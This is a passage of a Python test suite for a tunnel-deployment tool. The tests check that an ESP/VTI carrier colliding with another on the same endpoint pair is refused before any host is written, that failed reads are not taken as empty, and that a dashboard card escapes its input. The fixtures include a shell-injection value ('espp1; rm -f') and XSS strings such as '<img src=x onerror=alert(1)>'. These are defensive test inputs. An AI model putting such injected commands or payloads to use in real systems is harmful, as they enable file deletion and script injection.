                                 ir_runner=ir_a, fr_runner=fr_a)
        check("deploy rollback", [ir_a, fr_a],
              set(plan["teardown_iran"]) | set(plan["teardown_foreign"]))

        # (b) a switchover away from the carrier to another carrier,
        # whose Stage 3 tears the carrier down mid-flight. (A switch
        # to an overlay keeps the carrier as its underlay instead, so
        # it stops no carrier unit and cannot carry this check.)
        pid_b = storage.add_pair(name=f"esp_budget_{int(time.time() * 1000)}", iran_host=ir_ip,
                                 foreign_host=fr_ip, frontend_port=8443)
        self.addCleanup(storage.delete_pair, pid_b)
        pair_b = {"id": pid_b, "name": "esp_budget", "frontend_port": 8443,
                  "iran": {"host": ir_ip, "port": 22}, "foreign": {"host": fr_ip, "port": 22}}
        bplan = protocols.generate_deployment("ESP", pid_b, ir_ip, fr_ip, 8443)
        ir_b, fr_b = _BudgetRunner(host_role="iran"), _BudgetRunner(host_role="foreign")
        mgr = failover.FailoverManager(min_interval_seconds=0, max_failovers_per_window=50,
                                       window_seconds=3600)
        res = mgr.execute_failover(pair_b, "ESP", "GRE", reason="budget check",
                                   dry_run=False, ir_runner=ir_b, fr_runner=fr_b)
        self.assertTrue(res.get("success"), f"fixture: the switchover did not reach its teardown: {res}")
        check("failover stage 3", [ir_b, fr_b],
              set(bplan["teardown_iran"]) | set(bplan["teardown_foreign"]))

        # (c) the benchmark sweep, which pre-cleans by wildcard and tears down in a `finally`.
        pid_c = storage.add_pair(name=f"esp_budget_bench_{int(time.time() * 1000)}", iran_host=ir_ip,
                                 foreign_host=fr_ip, frontend_port=8443)
        self.addCleanup(storage.delete_pair, pid_c)
        pair_c = {"id": pid_c, "name": "esp_budget_bench", "frontend": 8443,
                  "iran": {"host": ir_ip, "port": 22}, "foreign": {"host": fr_ip, "port": 22}}
        ir_c, fr_c = _BudgetRunner(host_role="iran"), _BudgetRunner(host_role="foreign")
        row = engine.run_single_benchmark(pair_c, "ESP", dry_run=False, ir_runner=ir_c, fr_runner=fr_c)
        self.assertEqual(row.get("protocol"), "ESP", f"fixture: {row.get('error')}")
        bench = protocols.generate_benchmark_plan("ESP", pid_c, ir_ip, fr_ip)
        check("benchmark teardown", [ir_c, fr_c],
              set(bench["teardown_iran"]) | set(bench["teardown_foreign"]))

        # The negative half: the budget is not a blanket raise. A read that must stay quick - the health
        # checker's `systemctl is-active`, whose whole purpose is to answer promptly - still runs on the
        # default, and so does the port release's stop of a process this product does not own.
        probe_ir = _BudgetRunner(host_role="iran")
        probe_ir.run("systemctl is-active best-tunnel-prod-p1-esp", best_effort=True, retryable=True)
        probe_ir.run("systemctl stop xray", best_effort=True)
        self.assertEqual(probe_ir.short_budgets(), [default_timeout, default_timeout],
                         "a quick read or a foreign process stop now waits two minutes for nothing")
        self.assertIn(f"TimeoutStopUSec={protocols.CARRIER_STOP_BUDGET_SEC}s", units["foreign"],
                      "the Foreign unit lost its declaration: the host whose teardowns were measured to "
                      "hang is the one that must bound them")

    def test_76_a_vti_endpoint_pair_can_be_held_by_exactly_one_carrier(self):
        """Refuse an ESP carrier whose outer endpoint pair another VTI already owns, before writing anything.

        The live defect this closes (2026-10-11, 11:12:42 UTC): `systemctl enable --now
        best-tunnel-prod-p1-esp` answered `Main process exited, code=exited, status=2/INVALIDARGUMENT`, and
        the only line that explained it was `RTNETLINK answers: File exists` on `ip link add name espp1 type
        vti local <iran> remote <foreign> key <reqid>` - in a journal the engine's rollback had already
        orphaned. Nothing about the name was taken: `espp1` was absent from `ip -o link show` and from
        `/sys/class/net`. What held the tuple was `espp4b`, the stopped leftover of a reuse probe, and the
        rule that made that fatal was measured in an isolated namespace on both hosts
        (scratch/vti_endpoint_collision3_20261011.out):

          * same endpoints, different key        -> refused (so the key is not the arbiter);
          * same endpoints, different name       -> refused (so no name this product invents is free);
          * different endpoints, same key        -> created (so the endpoints are the arbiter, and rotating
            `ESP_SEED` cannot free a carrier);
          * reversed endpoints                   -> created on both hosts
            (scratch/vti_orientation_20261011.out), so the arbiter is the ORDERED pair and a gate that
            matched the unordered pair would refuse deployments the kernel accepts.

        Operationally that means at most one ESP carrier can exist between two hosts per direction: a second
        pair on the same hosts, or a benchmark carrier overlapping a production one, must be refused by name
        rather than discovered as an opaque unit failure after both hosts have been written.
        """
        doc_ir, doc_fr = "198.51.100.10", "203.0.113.20"
        # Fixture text in the grammar read off the live hosts: `<idx>: <name>@NONE: ... link/ipip A peer B
        # ... vti remote B local A ikey 0x.. okey 0x.. ... numtxqueues 1`. `ip_vti0` is the kernel's default
        # device and prints `remote any local any`; it is present on both hosts, so the matcher must never
        # treat it as an occupant.
        occupant_line = (fr"28: espp4b@NONE: <POINTOPOINT,NOARP> mtu 1350 qdisc noqueue state DOWN \\ "
                         f"link/ipip {doc_ir} peer {doc_fr} promiscuity 0 \\ "
                         f"vti remote {doc_fr} local {doc_ir} ikey 0x1d2b3c okey 0x1d2b3c numtxqueues 1\n")
        default_line = ("5: ip_vti0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN \\ "
                        "link/ipip 0.0.0.0 brd 0.0.0.0 xfrm-dev \\ "
                        "vti remote any local any numtxqueues 1 numrxqueues 1\n")
        own_line = (fr"31: espp1@NONE: <POINTOPOINT,NOARP> mtu 1350 \\ link/ipip {doc_ir} peer {doc_fr} \\ "
                    f"vti remote {doc_fr} local {doc_ir} ikey 0xaa okey 0xaa numtxqueues 1\n")

        # ---- 1. the rule itself, as a pure function over the listing --------------------------------
        self.assertEqual(protocols.vti_occupant(default_line + occupant_line, doc_ir, doc_fr, "espp1"),
                         "espp4b", "the occupant that blocked the live carrier must be named")
        self.assertEqual(protocols.vti_occupant(default_line + own_line, doc_ir, doc_fr, "espp1"), "",
                         "under the reuse design the carrier's own nameplate is the expected state of a "
                         "redeploy; naming it as an occupant would refuse every second start")
        self.assertEqual(protocols.vti_occupant(default_line + occupant_line, doc_fr, doc_ir, "espp1"), "",
                         "the reversed direction was measured as creatable; matching it would refuse a "
                         "deployment the kernel accepts")
        self.assertEqual(protocols.vti_occupant("", doc_ir, doc_fr, "espp1"), "",
                         "no listing must not be read as a collision")
        self.assertEqual(protocols.vti_occupant("bash: ip: command not found", doc_ir, doc_fr, "espp1"), "",
                         "an unreadable host answers with prose, and prose is not an occupant")
        for bad in ((None, doc_fr, "espp1"), (doc_ir, "10.11.12", "espp1"), (doc_ir, doc_fr, "espp1; rm -f")):
            with self.assertRaises(ValueError, msg=f"must reject {bad}"):
                protocols.vti_occupant(occupant_line, *bad)

        # ---- 2. the refusal names the device and carries no address ---------------------------------
        class _ListingRunner(RecordingRunner):
            """Answers the VTI listing and the PREROUTING read with chosen text; all else as the mock."""

            def __init__(self, listing, *args, **kwargs):
                super().__init__(*args, **kwargs)
                self.listing = listing

            def run(self, cmd, **kwargs):
                if "link show type vti" in cmd:
                    self.commands.append(cmd)
                    return 0, self.listing, ""
                if "PREROUTING" in cmd:
                    self.commands.append(cmd)
                    return 0, "-P PREROUTING ACCEPT\n", ""
                return super().run(cmd, **kwargs)

        held = _ListingRunner(default_line + occupant_line, host_role="iran")
        free = _ListingRunner(default_line + own_line, host_role="iran")
        blocked_txt = engine.carrier_vti_conflict(held, "iran", doc_ir, doc_fr, "espp1")
        self.assertIn("espp4b", blocked_txt, "the operator has to be told which interface to remove")
        self.assertIn("NOT_MEASURABLE", blocked_txt)
        self.assertEqual(re.findall(r"\b\d{1,3}(?:\.\d{1,3}){3}\b", blocked_txt), [],
                         f"a refusal that quoted the endpoint pair would put a host address in a persisted "
                         f"log field and then in a report: {blocked_txt[:120]}")
        self.assertEqual(engine.carrier_vti_conflict(free, "iran", doc_ir, doc_fr, "espp1"), "",
                         "a carrier that can be created must not be refused")

        # ---- 3. every path that writes a host asks, and asks before it writes ------------------------
        # Identity, not repetition: report056's lesson is that a rule reimplemented per path drifts, and
        # the drift shows up on the path nobody tests.
        self.assertIs(failover.engine.carrier_vti_conflict, engine.carrier_vti_conflict,
                      "failover must consult the same gate object")
        self.assertIs(protocols.vti_occupant, engine.protocols.vti_occupant)

        pid = storage.add_pair(name=f"vti-conflict-{int(time.time() * 1000)}",
                               iran_host=doc_ir, foreign_host=doc_fr, frontend_port=9477)
        self.addCleanup(storage.delete_pair, pid)
        pair = {"id": pid, "name": "vti", "frontend": 9477, "frontend_port": 9477,
                "iran": {"host": doc_ir, "port": 22, "user": "root"},
                "foreign": {"host": doc_fr, "port": 22, "user": "root"}}

        ir_h, fr_h = (_ListingRunner(default_line + occupant_line, host_role="iran"),
                      _ListingRunner(default_line + occupant_line, host_role="foreign"))
        with self.assertRaises(ValueError) as ctx:
            engine.deploy_tunnel(pair=pair, choice="ESP", dry_run=False, force_confirmed=True,
                                 ir_runner=ir_h, fr_runner=fr_h)
        self.assertIn("espp4b", str(ctx.exception))
        for name, r in (("iran", ir_h), ("foreign", fr_h)):
            self.assertEqual(r.state.get("files", {}), {},
                             f"{name}: the deploy wrote host files before the collision was noticed, which "
                             f"is the state from which a rollback can take a live tunnel down")
            self.assertFalse([c for c in r.commands if "systemctl enable" in c or "systemctl start" in c],
                             f"{name}: a unit was started on a carrier that cannot exist")
        # Both hosts are consulted, each in its own orientation, and the gate short-circuits on the first
        # refusal. The first draft of this assertion demanded both listings had been issued, which is not
        # what the product does - and demanding it would have been the smaller mistake, because the case
        # that proves a two-sided check is the one where Iran is clean and *Foreign* holds the tuple: a gate
        # that looked only at Iran, or sent one orientation to both hosts, passes the first shape and misses
        # the live defect. On each host the same leftover device holds a different ordered pair.
        def vti_line(idx, name, local, remote, key="0x1d2b3c"):
            return (fr"{idx}: {name}@NONE: <POINTOPOINT,NOARP> mtu 1350 \\ link/ipip {local} peer {remote} \\ "
                    f"vti remote {remote} local {local} ikey {key} okey {key} numtxqueues 1\n")

        own_iface = protocols.carrier_iface("ESP", pid, "prod")
        occupant_fr = vti_line(27, "espp2b", doc_fr, doc_ir, "0x77")
        self.assertIn("espp2b", engine.carrier_vti_conflict(
            _ListingRunner(default_line + occupant_fr, host_role="foreign"),
            "foreign", doc_fr, doc_ir, own_iface))
        self.assertIn("on foreign", engine.carrier_vti_conflict(
            _ListingRunner(default_line + occupant_fr, host_role="foreign"),
            "foreign", doc_fr, doc_ir, own_iface), "the refusal has to name the host that refuses")
        self.assertEqual(engine.carrier_vti_conflict(
            _ListingRunner(default_line + vti_line(31, own_iface, doc_ir, doc_fr), host_role="iran"),
            "iran", doc_ir, doc_fr, own_iface), "",
            "a host holding only this carrier's own nameplate is not a conflict")

        ir_c2 = _ListingRunner(default_line + vti_line(31, own_iface, doc_ir, doc_fr), host_role="iran")
        fr_h2 = _ListingRunner(default_line + occupant_fr, host_role="foreign")
        with self.assertRaises(ValueError) as ctx2:
            engine.deploy_tunnel(pair=pair, choice="ESP", dry_run=False, force_confirmed=True,
                                 ir_runner=ir_c2, fr_runner=fr_h2)
        self.assertIn("espp2b", str(ctx2.exception),
                      "the occupant on the second host has to be named by the refusal it caused")
        self.assertEqual(fr_h2.state.get("files", {}), {},
                         "Foreign was written before the collision on Foreign was noticed")

        # The benchmark path returns the blocked-row shape rather than raising: a sweep must survive it.
        ir_b, fr_b = (_ListingRunner(default_line + occupant_line, host_role="iran"),
                      _ListingRunner(default_line + occupant_line, host_role="foreign"))
        row = engine.run_single_benchmark(pair, "ESP", dry_run=False, ir_runner=ir_b, fr_runner=fr_b)
        self.assertTrue(row.get("blocked") or row.get("not_measurable"),
                        f"the benchmark swallowed the collision: {str(row)[:200]}")
        self.assertEqual(ir_b.state.get("files", {}), {},
                         "the benchmark wrote a carrier onto a host that cannot hold it")

        # A switchover bypasses deploy_tunnel, so without this an outage would promote the carrier that a
        # deploy refuses - and by Stage 3 the previous tunnel is already gone.
        ir_f, fr_f = (_ListingRunner(default_line + occupant_line, host_role="iran"),
                      _ListingRunner(default_line + occupant_line, host_role="foreign"))
        mgr = failover.FailoverManager(min_interval_seconds=0, max_failovers_per_window=50,
                                       window_seconds=3600)
        res = mgr.execute_failover(pair, "chisel-wss", "ESP", reason="attempt onto a blocked carrier",
                                   dry_run=False, ir_runner=ir_f, fr_runner=fr_f)
        self.assertFalse(res.get("success"), f"the switchover reported a success: {str(res)[:200]}")
        self.assertTrue(res.get("blocked") and res.get("not_measurable"),
                        f"the switchover did not refuse: {str(res)[:200]}")
        self.assertIn("espp4b", res.get("reason", ""), "the operator must be told which interface holds it")
        self.assertEqual(ir_f.state.get("files", {}), {},
                         "Stage 2 staged files before the collision was checked; from there the abort is an "
                         "outage, not a refusal")
        self.assertEqual(fr_f.state.get("files", {}), {}, "Foreign was staged before the gate spoke")

    def test_77_the_negative_case_a_gate_forgets_is_the_one_it_refuses_forever(self):
        """A carrier whose own interface is the only holder must still deploy - and a stopped carrier is
        not an occupant to be cleared by force.

        The reuse design leaves `espp1` present-and-down after every teardown, so on the next deploy that
        nameplate is on the tuple. If the gate counted it, the second deploy of any ESP carrier would be
        refused by the first one's residue and the pair would be locked until a reboot - a gate that
        degrades into a one-shot. test_76 asserts the exclusion; this asserts the *consequence* through the
        deploy path, because the exclusion is a property of the matcher and the lockout is a property of the
        product. Both production and benchmark nameplates are exercised, since a call site can exclude the
        right *kind* of device and still be the wrong device.
        """
        doc_ir, doc_fr = "198.51.100.10", "203.0.113.20"
        default_line = ("5: ip_vti0@NONE: <NOARP> mtu 1480 \\ link/ipip 0.0.0.0 brd 0.0.0.0 \\ "
                        "vti remote any local any numtxqueues 1\n")

        class _SelfRunner(RecordingRunner):
            def __init__(self, listing, *args, **kwargs):
                super().__init__(*args, **kwargs)
                self.listing = listing

            def run(self, cmd, **kwargs):
                if "link show type vti" in cmd:
                    self.commands.append(cmd)
                    return 0, self.listing, ""
                if "PREROUTING" in cmd:
                    self.commands.append(cmd)
                    return 0, "-P PREROUTING ACCEPT\n", ""
                return super().run(cmd, **kwargs)

        pid = storage.add_pair(name=f"vti-self-{int(time.time() * 1000)}",
                               iran_host=doc_ir, foreign_host=doc_fr, frontend_port=9478)
        self.addCleanup(storage.delete_pair, pid)
        pair = {"id": pid, "name": "vti-self", "frontend": 9478, "frontend_port": 9478,
                "iran": {"host": doc_ir, "port": 22, "user": "root"},
                "foreign": {"host": doc_fr, "port": 22, "user": "root"}}
        # The nameplate has to be this pair's own interface, spelled the way the product spells it. Hardly
        # any of this file's fixtures can assume a pair id: `storage.add_pair` assigns it, and a fixture
        # naming `espp1` for pair 12 tests a collision rather than the reuse it means to prove.
        iface = protocols.carrier_iface("ESP", pid, "prod")

        def own_line_for(local, remote, name=None):
            """This carrier's own nameplate as each host prints it, in that host's orientation.

            Foreign spells the same device with the endpoints swapped, because `vti remote R local L` is
            read off the peer address of that host's tunnel. A fixture that reused Iran's string for both
            hosts would test the same ordered pair twice and never the reversed one the kernel accepts.
            """
            return (fr"31: {name or iface}@NONE: <POINTOPOINT,NOARP> mtu 1350 \\ "
                    f"link/ipip {local} peer {remote} \\ "
                    f"vti remote {remote} local {local} ikey 0xaa okey 0xaa numtxqueues 1\n")

        ir = _SelfRunner(default_line + own_line_for(doc_ir, doc_fr), host_role="iran")
        fr = _SelfRunner(default_line + own_line_for(doc_fr, doc_ir), host_role="foreign")
        try:
            engine.deploy_tunnel(pair=pair, choice="ESP", dry_run=False, force_confirmed=True,
                                 ir_runner=ir, fr_runner=fr)
        except ValueError as ex:
            self.assertNotIn("already holds this pair's outer endpoint pair", str(ex),
                             "a redeploy over its own stopped carrier was refused: the pair would be "
                             "locked until a reboot by a gate that counts its own nameplate")
            raise
        self.assertTrue(any("link show type vti" in c for c in ir.commands),
                        "Iran was never asked, so the gate's negative case was not exercised")
        self.assertTrue(any("link show type vti" in c for c in fr.commands),
                        "Foreign was never asked, so the exclusion was proved on one host only")
        self.assertFalse([c for c in ir.issued().splitlines() if "espp" in c and "link del" in c],
                         "the gate closed by deleting the interface it just declined to collide with - "
                         "which is the operation this kernel parks on")

        # The same negative case on the benchmark path, judged on the *bench* nameplate. This block exists
        # because a mutation run (scratch/mutation_seal.py) showed that passing `carrier_iface(..., "prod")`
        # to the benchmark's gate - i.e. excluding the wrong device - left every test in this file green:
        # test_76's benchmark case presents a third-party occupant, which any exclusion still names, and
        # only a listing holding the benchmark carrier's own leftover distinguishes the two nameplates.
        # The consequence of that bug is the lockout this whole test is about, on the sweep: the second ESP
        # benchmark of a pair would be refused by the first one's residue, forever, for every pair.
        bench_iface = protocols.carrier_iface("ESP", pid, "bench")
        ir_b = _SelfRunner(default_line + own_line_for(doc_ir, doc_fr, bench_iface), host_role="iran")
        fr_b = _SelfRunner(default_line + own_line_for(doc_fr, doc_ir, bench_iface), host_role="foreign")
        row, raised = None, ""
        try:
            row = engine.run_single_benchmark(pair, "ESP", dry_run=False, ir_runner=ir_b, fr_runner=fr_b)
        except Exception as ex:
            raised = f"{type(ex).__name__}: {ex}"
        for name, r in (("iran", ir_b), ("foreign", fr_b)):
            self.assertTrue(any("link show type vti" in c for c in r.commands),
                            f"{name}: the benchmark never consulted the gate, so its negative case was "
                            f"not exercised on that host either way")
        spoken = "already holds this pair's outer endpoint pair"
        self.assertNotIn(spoken, str(row) + raised,
                         f"the ESP benchmark refused its own stopped benchmark carrier: {str(row)[:200]}")

    def test_78_a_failed_vti_read_must_not_look_like_an_empty_one(self):
        """`ip -d -o link show type vti 2>/dev/null` prints nothing when it *fails*, and nothing is exactly
        what a host holding no VTI prints.

        So a gate that ignores the exit status reports "free" from a host it could not read, and guessing
        free is the failure this product already paid for: both hosts written, then the unit that cannot be
        created, then a rollback. A non-zero read is therefore retried as the unfiltered listing - the same
        question, answerable that way - and only when that fails too is the operation refused, with a reason
        that says the check could not be made and quotes none of the host's stderr, because a netlink error
        line can carry an address. The two refusals also get different audit keys: recording a conflict that
        nobody observed would put an unproven fact in the permanent log.
        """
        doc_ir, doc_fr = "198.51.100.10", "203.0.113.20"
        default_line = ("5: ip_vti0@NONE: <NOARP> mtu 1480 \\ link/ipip 0.0.0.0 brd 0.0.0.0 \\ "
                        "vti remote any local any numtxqueues 1\n")
        occupant_line = (fr"28: espp4b@NONE: <POINTOPOINT,NOARP> mtu 1350 \\ link/ipip {doc_ir} peer {doc_fr} \\ "
                         f"vti remote {doc_fr} local {doc_ir} ikey 0x77 okey 0x77 numtxqueues 1\n")

        class _UnreadableRunner(RecordingRunner):
            """The filtered VTI read always fails; `fallback` decides whether the unfiltered one answers."""

            def __init__(self, fallback=None, *args, **kwargs):
                super().__init__(*args, **kwargs)
                self.fallback = fallback

            def run(self, cmd, **kwargs):
                if "link show type vti" in cmd:
                    self.commands.append(cmd)
                    return 1, "", "Error: Argument is not supported\n"
                if cmd == protocols.VTI_LISTING_FALLBACK_CMD:
                    self.commands.append(cmd)
                    return (0, self.fallback, "") if self.fallback is not None else (1, "", "unreadable\n")
                if "PREROUTING" in cmd:
                    self.commands.append(cmd)
                    return 0, "-P PREROUTING ACCEPT\n", ""
                return super().run(cmd, **kwargs)

        pid = storage.add_pair(name=f"vti-unreadable-{int(time.time() * 1000)}",
                               iran_host=doc_ir, foreign_host=doc_fr, frontend_port=9479)
        self.addCleanup(storage.delete_pair, pid)
        pair = {"id": pid, "name": "vti-unread", "frontend": 9479, "frontend_port": 9479,
                "iran": {"host": doc_ir, "port": 22, "user": "root"},
                "foreign": {"host": doc_fr, "port": 22, "user": "root"}}
        iface = protocols.carrier_iface("ESP", pid, "prod")

        answered = _UnreadableRunner(default_line + occupant_line, host_role="iran")
        txt = engine.carrier_vti_conflict(answered, "iran", doc_ir, doc_fr, iface)
        self.assertTrue(any(c == protocols.VTI_LISTING_FALLBACK_CMD for c in answered.commands),
                        "the gate gave up after the filtered read instead of asking the unfiltered one")
        self.assertIn("espp4b", txt, "a host that answers the fallback has to be checked, not excused")

        unread = engine.carrier_vti_conflict(_UnreadableRunner(host_role="iran"),
                                             "iran", doc_ir, doc_fr, iface)
        self.assertIn("could not be read", unread, "an unreadable host has to be named as unreadable")
        self.assertEqual(re.findall(r"\b\d{1,3}(?:\.\d{1,3}){3}\b", unread), [],
                         f"the unreadable refusal quoted an address: {unread[:160]}")
        self.assertNotIn("already holds", unread,
                         "the refusal stated a conflict nobody observed")

        ir_d, fr_d = _UnreadableRunner(host_role="iran"), _UnreadableRunner(host_role="foreign")
        with self.assertRaises(ValueError) as ctx:
            engine.deploy_tunnel(pair=pair, choice="ESP", dry_run=False, force_confirmed=True,
                                 ir_runner=ir_d, fr_runner=fr_d)
        self.assertIn("could not be read", str(ctx.exception))
        self.assertEqual(ir_d.state.get("files", {}), {},
                         "the deploy wrote Iran's files on a host whose VTI table it could not read")

        ir_f, fr_f = _UnreadableRunner(host_role="iran"), _UnreadableRunner(host_role="foreign")
        mgr = failover.FailoverManager(min_interval_seconds=0, max_failovers_per_window=50,
                                       window_seconds=3600)
        res = mgr.execute_failover(pair, "chisel-wss", "ESP", reason="switchover onto an unreadable host",
                                   dry_run=False, ir_runner=ir_f, fr_runner=fr_f)
        self.assertFalse(res.get("success"), f"the switchover did not refuse: {str(res)[:200]}")
        logged = [r for r in storage.get_audit_logs(limit=300)
                  if r["pair_id"] == pid and r["action"] == "FAILOVER_BLOCKED"]
        self.assertTrue(logged, "an automated refusal the operator cannot read is not a control")
        self.assertEqual(logged[0]["status"], "CARRIER_VTI_UNREADABLE",
                         "the audit record claimed a conflict that was never observed")

    def _js_source(self, marker: str) -> str:
        """One complete top-level function/const, extracted by brace depth from the shipped page."""
        start = dashboard.PAGE.index(marker)
        depth, end = 0, None
        for i, ch in enumerate(dashboard.PAGE[start:], start):
            if ch == "{":
                depth += 1
            elif ch == "}":
                depth -= 1
                if depth == 0:
                    end = i + 1
                    break
        self.assertIsNotNone(end, f"could not extract {marker!r}")
        return dashboard.PAGE[start:end]

    def test_79_the_one_carrier_per_direction_rule_is_visible_before_the_deploy_button(self):
        """The manager's ruling on report059 §11.3: the limit is a *rule in the UI*, not a refusal to be
        discovered at deploy time.

        `carrier_vti_conflict` asks the kernel who owns the tuple, which is the only honest way to decide a
        deploy - and it can only answer when a deploy is already being attempted. The rule itself needs no
        host: two pair rows that declare `underlay_carrier = esp` and share an ordered endpoint pair cannot
        both hold a VTI, and the reversed direction is a separate slot (measured as creatable on both live
        hosts in test_76). So this test pins three things at once: the derivation from stored rows alone,
        the direction sensitivity that a matcher which compared the pair unordered would lose, and the
        renderer that shows it.

        No address may leave the derivation in either direction. A slot is a grouping key; the operator
        needs the pair name and the interface nameplate, and an address in a rendered card is a leak path
        that a screenshot turns into a permanent one.
        """
        ir, fr = "198.51.100.10", "203.0.113.20"

        def row(pid, name, carrier, iran_host=ir, foreign_host=fr):
            return {"id": pid, "name": name, "underlay_carrier": carrier,
                    "iran_host": iran_host, "foreign_host": foreign_host}

        pairs = [row(1, "esp-holder", "ESP"), row(2, "esp-challenger", "esp"),
                 row(3, "reversed", "ESP", iran_host=fr, foreign_host=ir),
                 row(4, "gre-pair", "GRE"), row(5, "half-recorded", "ESP", foreign_host="")]
        slots = engine.carrier_slot_rule(pairs)

        # ---- 1. The slot is per ordered tuple and per role, first id holding it.
        by_key = {(s["host_role"], s["pair_id"]): s for s in slots}
        self.assertIn(("iran", 1), by_key, "the lowest-id ESP pair lost its iran-direction slot")
        self.assertIn(("foreign", 1), by_key, "the holder must own a slot in *both* directions")
        self.assertEqual(by_key[("iran", 1)]["claimants"], 2, by_key[("iran", 1)])
        self.assertEqual([w["pair_id"] for w in by_key[("iran", 1)]["would_be_refused"]], [2])
        self.assertEqual(by_key[("iran", 1)]["iface"], protocols.carrier_iface("ESP", 1, "prod"))
        self.assertEqual(by_key[("iran", 1)]["would_be_refused"][0]["iface"],
                         protocols.carrier_iface("ESP", 2, "prod"),
                         "the refusal has to name the interface the challenger asked for, or the operator "
                         "cannot tell which carrier is being refused")
        self.assertEqual(by_key[("iran", 1)]["pair_name"], "esp-holder")
        self.assertEqual(by_key[("iran", 1)]["would_be_refused"][0]["pair_name"], "esp-challenger",
                         "pair names are stored free text and a rendered claimant keeps its whitespace")

        # ---- 2. The reversed direction is a different slot: a rule that refused it would over-refuse.
        self.assertIn(("iran", 3), by_key, "the reversed pair lost its own slot")
        self.assertEqual(by_key[("iran", 3)]["claimants"], 1, by_key[("iran", 3)])
        self.assertEqual(by_key[("iran", 3)]["would_be_refused"], [])
        self.assertNotEqual({(s["host_role"], s["pair_id"]) for s in slots if s["pair_id"] == 3},
                            {(s["host_role"], s["pair_id"]) for s in slots if s["pair_id"] == 1},
                            "a pair whose endpoints are swapped shares no slot with the original")

        # ---- 3. What is not ESP, and what has no far endpoint, is absent rather than guessed about.
        self.assertNotIn(4, {s["pair_id"] for s in slots} |
                         {w["pair_id"] for s in slots for w in s["would_be_refused"]},
                         "a GRE declaration was counted against an ESP slot")
        self.assertNotIn(5, {s["pair_id"] for s in slots},
                         "a pair with one endpoint unknown cannot own a slot; claiming it holds one is "
                         "the same guess as treating an unreadable VTI listing as an empty one")

        # ---- 4. Nothing routable leaves the derivation.
        blob = json.dumps(slots, ensure_ascii=False)
        self.assertEqual(re.findall(r"\b\d{1,3}(?:\.\d{1,3}){3}\b", blob), [],
                         f"the slot table carried an address: {blob[:200]}")
        self.assertIn("در هر جهت", engine.CARRIER_SLOT_RULE_TEXT,
                      "the rule text must name the direction the limit is keyed on")
        self.assertIn("ESP", engine.CARRIER_SLOT_RULE_TEXT)
        self.assertEqual(re.findall(r"\b\d{1,3}(?:\.\d{1,3}){3}\b", engine.CARRIER_SLOT_RULE_TEXT), [],
                         "the rule text quoted an address")

        # ---- 5. The shipped page wires the derivation to the operator: payload, container, renderer.
        src = inspect.getsource(dashboard)
        self.assertIn('"carrier_slots": engine.carrier_slot_rule(pairs)', src,
                      "the /api payload dropped the slot table, so the card can only render an empty rule")
        self.assertIn('"carrier_rule_text": engine.CARRIER_SLOT_RULE_TEXT', src)
        self.assertIn('id="carrierRule"', dashboard.PAGE)
        self.assertIn("function carrierRuleHtml", dashboard.PAGE)
        # The call site, pinned with the line that precedes it. `assertIn("renderCarrierRule(p)")` alone is
        # satisfied by the function's own definition line, so it stayed green while the seal deleted the
        # call and the card painted nothing - the presence-only assert this project has now been caught
        # writing three times, once by me.
        self.assertIn("renderBenchmarks(p);\n        renderCarrierRule(p);", dashboard.PAGE,
                      "the renderer exists but is never called, which is a widget that is always empty")
        self.assertIn("renderCarrierRule(null)", dashboard.PAGE,
                      "a cleared or unsaved form must still state the rule it is about to hit")

        # The whole inline script is parsed, not just the function copied out of it: a brace left over
        # from an edit to the page breaks every renderer at once, and an extractor that slices by brace
        # depth would happily hand back a syntactically valid *fragment* of a broken page.
        if node := shutil.which("node"):
            js = dashboard.PAGE.split("<script>", 1)[1].split("</script>", 1)[0]
            check = os.path.join(tempfile.mkdtemp(), "page_script.js")
            with open(check, "w", encoding="utf-8") as fh:
                fh.write(js)
            parsed = subprocess.run([node, "--check", check], capture_output=True,
                                    encoding="utf-8", timeout=120)
            self.assertEqual(parsed.returncode, 0, parsed.stderr[:400])

        # ---- 6. The renderer is executed, not string-pinned. report054's lesson: an assert that only
        # looked for a phrase passed while the code that produced the phrase was rejecting nothing.
        node = shutil.which("node")
        if not node:
            print("    [test_79] node is not installed: the carrier-rule card is string-pinned only")
            return
        driver = (self._js_source("function escapeHtml(s) {") + "\n"
                  + self._js_source("const CARRIER_ROLE_LABEL =") + "\n"
                  + self._js_source("function carrierRuleHtml(p, slots, ruleText) {") + "\n"
                  + "const cases = JSON.parse(process.argv[2]);\n"
                  + "process.stdout.write(JSON.stringify("
                    "cases.map(c => carrierRuleHtml(c.p, c.slots, c.ruleText))));\n")
        script = os.path.join(tempfile.mkdtemp(), "carrier_rule.js")
        with open(script, "w", encoding="utf-8") as fh:
            fh.write(driver)
        payload = [
            {"p": {"id": 1, "underlay_carrier": "ESP"}, "slots": slots, "ruleText": "RULETEXT"},
            {"p": {"id": 2, "underlay_carrier": "esp"}, "slots": slots, "ruleText": "RULETEXT"},
            {"p": {"id": 3, "underlay_carrier": "ESP"}, "slots": slots, "ruleText": "RULETEXT"},
            {"p": {"id": 4, "underlay_carrier": "GRE"}, "slots": slots, "ruleText": "RULETEXT"},
            {"p": {"id": 9, "underlay_carrier": "ESP"}, "slots": [], "ruleText": "RULETEXT"},
            {"p": None, "slots": slots, "ruleText": "RULETEXT"},
            {"p": {"id": 2, "underlay_carrier": "ESP"}, "slots": [{
                "host_role": "iran", "pair_id": 1, "pair_name": "<img src=x onerror=alert(1)>",
                "iface": "espp1', \"", "claimants": 2,
                "would_be_refused": [{"pair_id": 2, "pair_name": "q\"onmouseover=1", "iface": "espp2"}]}],
             "ruleText": "<script>bad()</script>"},
        ]
        proc = subprocess.run([node, script, json.dumps(payload)], capture_output=True,
                              encoding="utf-8", timeout=120)
        self.assertEqual(proc.returncode, 0, proc.stderr[:400])
        shown = json.loads(proc.stdout)

        self.assertIn("نگهدارنده اسلات", shown[0], shown[0][:200])
        self.assertIn("espp1", shown[0])
        self.assertIn("بازمی‌دارد", shown[0],
                      "the holder's card must say it is holding the slot against somebody")
        self.assertIn("#2", shown[0])
        self.assertIn("رد می‌شود", shown[1], shown[1][:200])
        self.assertIn("esp-holder", shown[1], "a refusal that does not name the holder is not actionable")
        self.assertIn("espp2", shown[1], "and it must name the interface the refused pair asked for")
        self.assertIn("espp1", shown[1])
        self.assertIn("نگهدارنده اسلات", shown[2], "the reversed pair holds its own slots")
        self.assertIn("ESP اعلام‌شده ندارد", shown[3])
        self.assertNotIn("رد می‌شود", shown[3], "a GRE pair must not be told it lost an ESP slot")
        self.assertIn("اسلاتی", shown[4], shown[4][:200])
        self.assertNotIn("نگهدارنده", shown[4])
        self.assertNotIn("اسلات", shown[5].split("RULETEXT")[-1],
                         "an unsaved form has no slot to report, only the rule")
